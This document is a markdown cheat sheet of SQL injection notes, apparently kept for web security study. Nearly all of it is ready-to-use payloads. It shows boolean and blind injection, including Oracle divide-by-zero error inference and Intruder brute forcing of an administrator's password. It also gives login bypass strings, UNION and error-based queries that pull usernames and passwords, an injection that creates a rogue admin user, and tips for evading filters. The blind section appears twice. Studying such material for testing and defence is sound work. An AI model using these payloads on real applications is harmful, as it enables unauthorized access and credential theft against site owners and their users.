# SQLi notes

#### Testing booleans (for BSQLi)
Remember to try `AND` `OR` `HAVING`  
we can test the ability bruteforce/presence of users by selecting a char, limiting to 1 and then comparing, so the below would become `a=a`  
`b' OR (select 'a' from users limit 1)='a`  
Now we can take a step further and confirm we have a user called "Administrator"  
`b' OR (select 'a' from users where username='administrator')='a`  
The ball keeps on rolling, and we can begin the makings of bruteforce attack by testing the length of password  
`b' OR (select 'a' from users where username='administrator' and length(password)>1)='a;`  
Once we have the length of the password we can bruteforce with a python script or intruder.
For intruder we use cluster bomb, and use the grep option to flag responses we know differ in `FALSE` and `TRUE`  
`b' OR (select substring (password,§1§,1) from users where username='administrator')='§a§`  

#### BlindSQL:
Truth must be "infered" generally with a sleep function, a 500 response, or DNS callout to webhooks/collaborator

Once we can get an injection, we need to confirm that the server is interpreting the injection as a valid query. This is done with a subquery.  
We initially send an empty query, if a 500 is returned, we may need to complete the query by selecting from a db. Ifreceive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.
`' ||(select '')||'`  
`' ||(select '' from dual)||'`  
We can then start to infer information, such as the existence of `users`  
`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
We weaponise this using the CASE statement, which will test a condition and if true/false will evaluate an expression.  
So, in the event that CASE comes out TRUE, we divide by 0 - causing an error.  
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`  
Now we start to infer the existence of information (users, passwords, tables, etc)  
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
`'||(SELECT CASE WHEN length(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'` 
Length of password  
`'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'. Then send: TrackingId='||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

#### Example PoCs: [BlindSQLI Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/bruteforce_blindsqli.py) [BlindNOsqli Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/brute_mongoDB_nosqli.py)

#### Bypass login
`admin' UNION SELECT 'pass' AS password FROM admins WHERE '1' = '1` in username field and then `pass` in password field  
`' or 1 =1 LIMIT 1,1#`

#### To jump to other tables:
`' UNION SELECT username, password FROM users--`

#### Enumerate database columns
`SELECT * FROM information_schema.tables`

#### Grab DB name
`%’ or 0=0 union select null, database() #`

#### Grab all column contents
`%’ and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users # Click Submit`

#### Grab a pw
`1 or 1 =1 union Select 1, password from users`  
`1'union select null, concat_ws (char (32,58,32), user, password) from users #`
`' or (select 1 from (Select count(*),concat((select password from admins),"+",floor(rand()*2))a from information_schema.tables group by a)b)#`

#### Enumerate version:
`SELECT * FROM v$version`
`SELECT @@version`
`SELECT version()`

#### Create your own user:
`INSERT INTO users (username, password, ID, privs) VALUES ('nuadmin','pass',2248,1)`

#### Hijack user creation form to create a user with admin privs:
`nuadmin', 'pass', 9999, 0)--`

#### Enumerating columns:
Consider an online user search, its statement would be something like:

`SELECT * FROM users WHERE ID=1`

To enumerate what we can union select, we can add a union select, and keep adding columns until we no longer get errors.

`ID=1 UNION SELECT 1,2--` OR `ID=1 ORDER BY 4` OR `GROUP BY 1,2,3,4,5,6,7,8,9,10`

If data from only first part of query is returned, we can invalidate it:

`ID=1 AND 1=2 UNION SELECT 1,2,3--`

If this returns our own values, we can start emumerating sys info:

`id=1 and 1=2 union select version(), user(),3`

#### Quick tips:
space sanitisation can be defeated with `/**/`

sometimes adding a comment at the end of query can complete the injection `--` (postgresql) `#` (mysql) `--+-`

Sometimes a webpage will take a parameter as a string, not an int - in which case we close the quotes so our entire injection isnt considered one string:

`SELECT * FROM users WHERE ID=1'` *Remember you may need to close the attack with another apostrophe*

`UNION` only selects distnict, use `UNION ALL` to select duplicates

To begin an attack, try to break the string with an invalidation

Pay attention to the backend use of single and double quotes in errors

#### BlindSQL:
Truth must be "infered" generally with a sleep function

Once we can get an injection, we need to confirm that the server is interpreting the injection as a valid query. This is done with a subquery.  
We initially send an empty query, if a 500 is returned, we may need to complete the query by selecting from a db. Ifreceive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.
`' ||(select '')||'`  
`' ||(select '' from dual)||'`  
We can then start to infer information, such as the existence of `users`  
`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`  
We weaponise this using the CASE statement, which will test a condition and if true/false will evaluate an expression.  
So, in the event that CASE comes out TRUE, we divide by 0 - causing an error.  
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`  
Now we start to infer the existence of information (users, passwords, tables, etc)  
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
`'||(SELECT CASE WHEN length(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
Now we bruteforce as before  
`'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  

### [Error Based SQLi](https://github.com/kymb0/web_study/blob/master/sqli/error_based_sqli.md)

